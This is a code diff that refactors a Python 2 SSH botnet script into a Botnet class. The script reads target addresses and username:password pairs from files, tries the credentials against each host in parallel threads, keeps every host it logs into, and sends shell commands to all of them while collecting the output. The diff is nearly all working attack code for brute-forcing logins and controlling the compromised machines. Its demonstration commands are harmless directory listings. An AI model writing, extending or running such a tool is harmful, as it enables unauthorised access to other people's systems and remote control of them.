@@ -9,9 +9,14 @@ import signal
 from time import sleep
 import threading
 
-class Client:
+class Command:
+    def __init__(self, command, output):
+        self.command = command
+        self.output = output
 
+class Client:
     def __init__(self, host, user, password):
+        self.commands = []
         self.host = host
         self.user = user
         self.password = password
@@ -27,20 +32,59 @@ class Client:
             return None
             print_color("[-] Connection timed out.", "red")
 
-    def send_command(self, cmd):
-        self.session.sendline(cmd)
-        self.session.prompt()
-        return self.session.before
+    def store_command_data(self, command, output):
+        self.commands.append(Command(command, output))
 
-def botnetCommand(command):
-    for client in botNet:
-        output = client.send_command(command)
-        print "[*] Output from " + client.host
-        print output
 
-def addClient(host, user, password):
-    client = Client(host, user, password)
-    botNet.append(client)
+class Botnet:
+    def __init__(self):
+        self.clients = []
+        with open('/etc/ips') as f:
+            self.ips = [x.strip() for x in f.readlines()]
+        with open('/etc/pass') as f:
+            self.credentials = [x.strip().split(':') for x in f.readlines()]
+
+    def add_client(self, client):
+        self.clients.append(client)
+
+    def login(self, ip):
+        for user, password in self.credentials:
+            try:
+                client = Client(ip, user, password)
+            except:
+                client = None
+            finally:
+                if client.session is not None:
+                    self.add_client(client)
+
+    def connect(self):
+        threads = []
+        for ip in self.ips:
+            t = threading.Thread(target=self.login, args=(ip,))
+            threads.append(t)
+            t.start()
+
+        for t in threads:
+            t.join()
+
+    def send_command(self, command):
+        for client in self.clients:
+            client.session.sendline(command)
+            client.session.prompt()
+            split_output = client.session.before.split("\n")
+            del split_output[0]
+            output = ""
+            for line in split_output:
+                output += line + "\n"
+            client.store_command_data(command, output)
+
+    def print_output(self):
+        for client in self.clients:
+            print "\n" + client.host
+            for command in client.commands:
+                print "\n" + command.command
+                print "\n" + command.output
+
 
 def print_color(text, color):
     if color is "green":
@@ -52,59 +96,24 @@ def print_color(text, color):
     else:
         print(text + "\nColor not found!")
 
-def timeoutFn(ip, credentials):
+# def login(botnet):
+#     for botnet.user, botnet.passwd in botnet.credentials:
+#         try:
+#             client = Client(ip, user, passwd)
+#         except:
+#             client = None
+#         finally:
+#             if client is not None:
+#                 botnet.add_client(client)
+#                 break
 
-    class TimeoutError(Exception):
-        pass
+def main():
+    botnet = Botnet()
 
-    def handler(signum, frame):
-        raise TimeoutError()
+    botnet.connect()
+    botnet.send_command("ls -la")
+    botnet.send_command("ls")
+    botnet.print_output()
 
-    for user, passwd in credentials:
-        #signal.signal(signal.SIGALRM, handler)
-        #signal.alarm(10)
-        try:
-            result = Client(ip, user, passwd)
-        except: #TimeoutError as exc:
-            result = None
-        finally:
-            #signal.alarm(0)
-            if result.session is not None:
-                botNet.append(result)
-                break
-
-botNet = []
-
-with open('/etc/ips') as f:
-    ips = [x.strip() for x in f.readlines()]
-
-with open('/etc/pass') as f:
-    credentials = [x.strip().split(':') for x in f.readlines()]
-
-threads = []
-
-for ip in ips:
-    t = threading.Thread(target=timeoutFn, args=(ip, credentials))
-    threads.append(t)
-    t.start()
-
-for t in threads:
-    t.join()
-
-print botNet
-
-# for ip in ips:
-#     for user, passwd in credentials:
-#         print_color("[*] Connecting to: " + user + "@" + ip + " P" + str(credentials.index([user , passwd]) + 1), "yellow")
-#         client = threading.Thread(target=timeoutFn, args=(ip, user, passwd,))
-#         botNet.append(client)
-#         client.start()
-#         if client.session is None:
-#             pass
-#         else:
-#             #client.send_command("sudo su")
-#             #client.session.sendline(passwd)
-#             botNet.append(client)
-#             break
-
-botnetCommand("ls -la")
+if __name__ == "__main__":
+    main()
